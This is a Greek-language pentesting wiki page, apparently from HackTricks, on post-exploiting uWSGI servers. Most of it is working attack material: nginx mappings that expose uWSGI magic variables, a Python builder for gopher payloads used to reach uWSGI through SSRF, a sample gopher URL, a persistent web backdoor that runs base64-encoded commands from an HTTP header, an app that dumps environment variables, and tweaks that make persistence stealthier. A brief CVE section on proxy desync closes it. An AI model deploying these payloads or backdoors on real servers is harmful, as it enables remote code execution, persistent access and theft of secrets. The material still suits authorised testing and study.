# WSGI Post-Exploitation Tricks

{{#include ../../banners/hacktricks-training.md}}

## Επισκόπηση WSGI

Web Server Gateway Interface (WSGI) είναι μια προδιαγραφή που περιγράφει πώς ένας web server επικοινωνεί με web εφαρμογές και πώς οι web εφαρμογές μπορούν να αλυσιδωθούν για να επεξεργαστούν ένα αίτημα. Το uWSGI είναι ένας από τους πιο δημοφιλείς WSGI servers, συχνά χρησιμοποιούμενος για την εξυπηρέτηση Python web εφαρμογών. Η εγγενής δυαδική μεταφορά του είναι το uwsgi protocol (lowercase) που μεταφέρει ένα σύνολο παραμέτρων κλειδιού/τιμής ("uwsgi params") στον backend application server.

Σχετικές σελίδες που ίσως θέλετε να δείτε:

{{#ref}}
werkzeug.md
{{#endref}}

{{#ref}}
../../pentesting-web/ssrf-server-side-request-forgery/README.md
{{#endref}}

## uWSGI Magic Variables Exploitation

Το uWSGI παρέχει ειδικές "magic variables" που μπορούν να αλλάξουν τον τρόπο με τον οποίο η διεργασία φορτώνει και διανέμει εφαρμογές. Αυτές οι μεταβλητές δεν είναι κανονικά HTTP headers — είναι παράμετροι uwsgi που μεταφέρονται μέσα στο uwsgi/SCGI/FastCGI αίτημα από τον reverse proxy (nginx, Apache mod_proxy_uwsgi, κ.λπ.) προς το uWSGI backend. Εάν μια ρύθμιση proxy αντιστοιχίσει δεδομένα ελεγχόμενα από τον χρήστη σε παραμέτρους uwsgi (για παράδειγμα μέσω `$arg_*`, `$http_*`, ή μη ασφαλώς εκτεθειμένων endpoints που μιλούν το uwsgi protocol), οι επιτιθέμενοι μπορούν να ορίσουν αυτές τις μεταβλητές και να πετύχουν εκτέλεση κώδικα.

### Επικίνδυνες αντιστοιχίσεις σε reverse proxies (παράδειγμα nginx)

Λανθασμένες ρυθμίσεις όπως οι παρακάτω εκθέτουν απευθείας τις "magic variables" του uWSGI σε εισερχόμενα δεδομένα χρήστη:
```
location /app/ {
include uwsgi_params;
# DANGEROUS: maps query args into uwsgi params
uwsgi_param UWSGI_FILE $arg_f;                 # /app/?f=/tmp/backdoor.py
uwsgi_param UWSGI_MODULE $http_x_mod;          # header: X-Mod: pkg.mod
uwsgi_param UWSGI_CALLABLE $arg_c;             # /app/?c=application
uwsgi_pass unix:/run/uwsgi/app.sock;
}
```
Αν η εφαρμογή ή το upload feature επιτρέπει την εγγραφή αρχείων σε ένα προβλέψιμο path, ο συνδυασμός του με τα παραπάνω mappings συνήθως οδηγεί σε άμεσο RCE όταν το backend φορτώσει το attacker-controlled file/module.

### Κύριες Εκμεταλλεύσιμες Μεταβλητές

#### `UWSGI_FILE` - Arbitrary File Load/Execute
```
uwsgi_param UWSGI_FILE /path/to/python/file.py;
```
Φορτώνει και εκτελεί ένα αυθαίρετο αρχείο Python ως WSGI εφαρμογή. Εάν ο attacker μπορεί να ελέγξει αυτή την παράμετρο μέσω του uwsgi param bag, μπορεί να επιτύχει Remote Code Execution (RCE).

#### `UWSGI_SCRIPT` - Script Loading
```
uwsgi_param UWSGI_SCRIPT module.path:callable;
uwsgi_param SCRIPT_NAME /endpoint;
```
Φορτώνει ένα συγκεκριμένο script ως νέα εφαρμογή. Σε συνδυασμό με file upload ή write capabilities, αυτό μπορεί να οδηγήσει σε RCE.

#### `UWSGI_MODULE` and `UWSGI_CALLABLE` - Dynamic Module Loading
```
uwsgi_param UWSGI_MODULE malicious.module;
uwsgi_param UWSGI_CALLABLE evil_function;
uwsgi_param SCRIPT_NAME /backdoor;
```
Αυτές οι παράμετροι επιτρέπουν τη φόρτωση αυθαίρετων Python modules και την κλήση συγκεκριμένων functions σε αυτά.

#### `UWSGI_SETENV` - Χειρισμός Μεταβλητών Περιβάλλοντος
```
uwsgi_param UWSGI_SETENV DJANGO_SETTINGS_MODULE=malicious.settings;
```
Μπορεί να χρησιμοποιηθεί για να τροποποιήσει μεταβλητές περιβάλλοντος, ενδεχομένως επηρεάζοντας τη συμπεριφορά της εφαρμογής ή φορτώνοντας κακόβουλη διαμόρφωση.

#### `UWSGI_PYHOME` - Τροποποίηση περιβάλλοντος Python
```
uwsgi_param UWSGI_PYHOME /path/to/malicious/venv;
```
Αλλάζει το Python virtual environment, ενδεχομένως φορτώνοντας κακόβουλα πακέτα ή διαφορετικούς Python interpreters.

#### `UWSGI_CHDIR` - Αλλαγή καταλόγου
```
uwsgi_param UWSGI_CHDIR /etc/;
```
Αλλάζει τον κατάλογο εργασίας πριν από την επεξεργασία των αιτημάτων και μπορεί να συνδυαστεί με άλλες δυνατότητες.

## SSRF + uwsgi protocol (gopher) pivot

### Μοντέλο απειλής

Εάν η στοχευόμενη web εφαρμογή εκθέτει ένα SSRF primitive και το uWSGI instance ακούει σε ένα εσωτερικό TCP socket (για παράδειγμα, `socket = 127.0.0.1:3031`), μπορείτε να επικοινωνήσετε με το ακατέργαστο uwsgi πρωτόκολλο μέσω gopher και να εγχύσετε uWSGI magic variables.

Αυτό είναι δυνατό επειδή πολλές εγκαταστάσεις χρησιμοποιούν έναν μη-HTTP uwsgi socket εσωτερικά· ο reverse proxy (nginx/Apache) μεταφράζει τα client HTTP σε uwsgi param bag. Με SSRF+gopher μπορείτε να δημιουργήσετε απευθείας το δυαδικό πακέτο uwsgi και να ορίσετε επικίνδυνες μεταβλητές όπως `UWSGI_FILE`.

### Δομή πρωτοκόλλου uWSGI (γρήγορη αναφορά)

- Κεφαλίδα (4 bytes): `modifier1` (1 byte), `datasize` (2 bytes little-endian), `modifier2` (1 byte)
- Body: sequence of `[key_len(2 LE)] [key_bytes] [val_len(2 LE)] [val_bytes]`

Για standard requests `modifier1` είναι 0. Το σώμα περιέχει uwsgi params όπως `SERVER_PROTOCOL`, `REQUEST_METHOD`, `PATH_INFO`, `UWSGI_FILE`, κ.λπ. Δείτε την επίσημη προδιαγραφή του πρωτοκόλλου για πλήρεις λεπτομέρειες.

### Ελάχιστος packet builder (generate gopher payload)
```python
import struct, urllib.parse

def uwsgi_gopher_url(host, port, params):
body = b''.join([struct.pack('<H', len(k))+k.encode()+struct.pack('<H', len(v))+v.encode() for k,v in params.items()])
pkt  = bytes([0]) + struct.pack('<H', len(body)) + bytes([0]) + body
return f"gopher://{host}:{port}/_" + urllib.parse.quote_from_bytes(pkt)

# Example URL:
gopher://127.0.0.1:5000/_%00%D2%00%00%0F%00SERVER_PROTOCOL%08%00HTTP/1.1%0E%00REQUEST_METHOD%03%00GET%09%00PATH_INFO%01%00/%0B%00REQUEST_URI%01%00/%0C%00QUERY_STRING%00%00%0B%00SERVER_NAME%00%00%09%00HTTP_HOST%0E%00127.0.0.1%3A5000%0A%00UWSGI_FILE%1D%00/app/profiles/malicious.json%0B%00SCRIPT_NAME%10%00/malicious.json
```
Παράδειγμα χρήσης για να αναγκάσετε το φόρτωμα ενός αρχείου που γράφτηκε προηγουμένως στον server:
```python
params = {
'SERVER_PROTOCOL':'HTTP/1.1', 'REQUEST_METHOD':'GET', 'PATH_INFO':'/',
'UWSGI_FILE':'/app/profiles/malicious.py', 'SCRIPT_NAME':'/malicious.py'
}
print(uwsgi_gopher_url('127.0.0.1', 3031, params))
```
Στείλτε το δημιουργημένο URL μέσω του SSRF sink.

### Παράδειγμα εργασίας

Αν μπορείτε να γράψετε ένα αρχείο python στο δίσκο (η επέκταση δεν έχει σημασία) με κώδικα όπως:
```python
# /app/profiles/malicious.py
import os
os.system('/readflag > /app/profiles/result.txt')

def application(environ, start_response):
start_response('200 OK', [('Content-Type','text/plain')])
return [b'ok']
```
Δημιούργησε και πυροδότησε ένα gopher payload που ορίζει το `UWSGI_FILE` σε αυτό το path. Το backend θα το εισάγει και θα το εκτελέσει ως WSGI app.

## Post-Exploitation Techniques

### 1. Persistent Backdoors

#### File-based Backdoor
```python
# backdoor.py
import subprocess, base64

def application(environ, start_response):
cmd = environ.get('HTTP_X_CMD', '')
if cmd:
result = subprocess.run(base64.b64decode(cmd), shell=True, capture_output=True, text=True)
response = f"STDOUT: {result.stdout}\nSTDERR: {result.stderr}"
else:
response = 'Backdoor active'
start_response('200 OK', [('Content-Type', 'text/plain')])
return [response.encode()]
```
Φόρτωσέ το με `UWSGI_FILE` και πρόσβασε το κάτω από ένα επιλεγμένο `SCRIPT_NAME`.

#### Environment-based Persistence
```
uwsgi_param UWSGI_SETENV PYTHONPATH=/tmp/malicious:/usr/lib/python3.11/site-packages;
```
### 2. Αποκάλυψη Πληροφοριών

#### Εξαγωγή μεταβλητών περιβάλλοντος
```python
# env_dump.py
import os, json

def application(environ, start_response):
env_data = {'os_environ': dict(os.environ), 'wsgi_environ': dict(environ)}
start_response('200 OK', [('Content-Type', 'application/json')])
return [json.dumps(env_data, indent=2).encode()]
```
#### Πρόσβαση στο σύστημα αρχείων
Συνδύασε `UWSGI_CHDIR` με ένα βοηθητικό πρόγραμμα εξυπηρέτησης αρχείων για να περιηγηθείς σε ευαίσθητους καταλόγους.

### 3. Ιδέες για Privilege Escalation

- Αν το uWSGI τρέχει με αυξημένα προνόμια και γράφει sockets/pids που ανήκουν στον root, η κατάχρηση του env και οι αλλαγές καταλόγων μπορεί να σε βοηθήσουν να αποθέσεις αρχεία με προνομιούχους ιδιοκτήτες ή να χειριστείς την κατάσταση εκτέλεσης.
- Η υπερισχύση της διαμόρφωσης μέσω του environment (`UWSGI_*`) μέσα σε ένα αρχείο που φορτώνεται μέσω `UWSGI_FILE` μπορεί να επηρεάσει το process model και τους workers ώστε να κάνει την persistence πιο stealthier.
```python
# malicious_config.py
import os

# Override uWSGI configuration
os.environ['UWSGI_MASTER'] = '1'
os.environ['UWSGI_PROCESSES'] = '1'
os.environ['UWSGI_CHEAPER'] = '1'
```
## Ζητήματα αποσυγχρονισμού reverse-proxy σχετικά με uWSGI chains (πρόσφατα)

Deployments που χρησιμοποιούν Apache httpd με `mod_proxy_uwsgi` έχουν αντιμετωπίσει πρόσφατα bugs response-splitting/desynchronization που μπορούν να επηρεάσουν το frontend↔backend translation layer:

- CVE-2023-27522 (Apache httpd 2.4.30–2.4.55; also relevant to uWSGI integration prior to 2.0.22/2.0.26 fixes): crafted origin response headers μπορούν να προκαλέσουν HTTP response smuggling όταν χρησιμοποιείται `mod_proxy_uwsgi`. Η αναβάθμιση του Apache σε ≥2.4.56 μετριάζει το ζήτημα.
- CVE-2024-24795 (fixed in Apache httpd 2.4.59; uWSGI 2.0.26 adjusted its Apache integration): HTTP response splitting σε πολλαπλά httpd modules μπορεί να οδηγήσει σε desync όταν backends εγχέουν headers. Στο changelog του uWSGI 2.0.26 αυτό εμφανίζεται ως “let httpd handle CL/TE for non-http handlers.”

Αυτά δεν παρέχουν άμεσα RCE σε uWSGI, αλλά σε edge cases μπορούν να αλυσοδεθούν με header injection ή SSRF για να pivot προς το uwsgi backend. Κατά τις δοκιμές, fingerprint τον proxy και την έκδοση και εξετάστε desync/smuggling primitives ως είσοδο σε backend-only routes και sockets.

## Αναφορές

- [uWSGI Magic Variables Documentation](https://uwsgi-docs.readthedocs.io/en/latest/Vars.html)
- [IOI SaveData CTF Writeup](https://bugculture.io/writeups/web/ioi-savedata)
- [uWSGI Security Best Practices](https://uwsgi-docs.readthedocs.io/en/latest/Security.html)
- [The uwsgi Protocol (spec)](https://uwsgi-docs.readthedocs.io/en/latest/Protocol.html)
- [uWSGI 2.0.26 changelog mentioning CVE-2024-24795 adjustments](https://uwsgi-docs.readthedocs.io/en/latest/Changelog-2.0.26.html)

{{#include ../../banners/hacktricks-training.md}}
